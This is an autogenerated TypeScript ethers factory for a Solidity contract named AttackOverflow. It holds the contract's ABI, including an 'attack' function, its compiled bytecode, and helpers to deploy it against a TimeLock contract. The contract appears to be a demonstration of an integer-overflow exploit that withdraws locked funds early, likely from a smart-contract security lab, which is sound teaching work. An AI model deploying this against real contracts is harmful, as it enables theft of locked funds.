/* Autogenerated file. Do not edit manually. */
/* tslint:disable */
/* eslint-disable */
import { Signer, utils, Contract, ContractFactory, Overrides } from "ethers";
import { Provider, TransactionRequest } from "@ethersproject/providers";
import type {
  AttackOverflow,
  AttackOverflowInterface,
} from "../AttackOverflow";

const _abi = [
  {
    inputs: [
      {
        internalType: "contract TimeLock",
        name: "_timeLock",
        type: "address",
      },
    ],
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    stateMutability: "payable",
    type: "fallback",
  },
  {
    inputs: [],
    name: "attack",
    outputs: [],
    stateMutability: "payable",
    type: "function",
  },
  {
    inputs: [],
    name: "getBalance",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "max",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
];

const _bytecode =
  "0x608060405234801561001057600080fd5b506040516102b53803806102b58339818101604052602081101561003357600080fd5b5051600080546001600160a01b039092166001600160a01b0319909216919091179055610250806100656000396000f3fe6080604052600436106100345760003560e01c806312065fe0146100365780636ac5db191461005d5780639e5faafc14610072575b005b34801561004257600080fd5b5061004b61007a565b60408051918252519081900360200190f35b34801561006957600080fd5b5061004b61007e565b610034610083565b4790565b600090565b60008054906101000a90046001600160a01b03166001600160a01b031663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b1580156100d157600080fd5b505af11580156100e5573d6000803e3d6000fd5b50506000546040805163a4beda6360e01b815230600482015290516001600160a01b0390921694506379af55e4935084925063a4beda63916024808301926020929190829003018186803b15801561013c57600080fd5b505afa158015610150573d6000803e3d6000fd5b505050506040513d602081101561016657600080fd5b5051604080516001600160e01b031960e085901b1681526000928303600482015290516024808301939282900301818387803b1580156101a557600080fd5b505af11580156101b9573d6000803e3d6000fd5b50506000805460408051633ccfd60b60e01b815290516001600160a01b039092169450633ccfd60b9350600480820193929182900301818387803b15801561020057600080fd5b505af1158015610214573d6000803e3d6000fd5b5050505056fea2646970667358221220e0778218f32151c3247711a99b1252368eb3092fa3acd688e08101631ffa311564736f6c63430007060033";

type AttackOverflowConstructorParams =
  | [signer?: Signer]
  | ConstructorParameters<typeof ContractFactory>;

const isSuperArgs = (
  xs: AttackOverflowConstructorParams
): xs is ConstructorParameters<typeof ContractFactory> => xs.length > 1;

export class AttackOverflow__factory extends ContractFactory {
  constructor(...args: AttackOverflowConstructorParams) {
    if (isSuperArgs(args)) {
      super(...args);
    } else {
      super(_abi, _bytecode, args[0]);
    }
    this.contractName = "AttackOverflow";
  }

  deploy(
    _timeLock: string,
    overrides?: Overrides & { from?: string | Promise<string> }
  ): Promise<AttackOverflow> {
    return super.deploy(_timeLock, overrides || {}) as Promise<AttackOverflow>;
  }
  getDeployTransaction(
    _timeLock: string,
    overrides?: Overrides & { from?: string | Promise<string> }
  ): TransactionRequest {
    return super.getDeployTransaction(_timeLock, overrides || {});
  }
  attach(address: string): AttackOverflow {
    return super.attach(address) as AttackOverflow;
  }
  connect(signer: Signer): AttackOverflow__factory {
    return super.connect(signer) as AttackOverflow__factory;
  }
  static readonly contractName: "AttackOverflow";
  public readonly contractName: "AttackOverflow";
  static readonly bytecode = _bytecode;
  static readonly abi = _abi;
  static createInterface(): AttackOverflowInterface {
    return new utils.Interface(_abi) as AttackOverflowInterface;
  }
  static connect(
    address: string,
    signerOrProvider: Signer | Provider
  ): AttackOverflow {
    return new Contract(address, _abi, signerOrProvider) as AttackOverflow;
  }
}
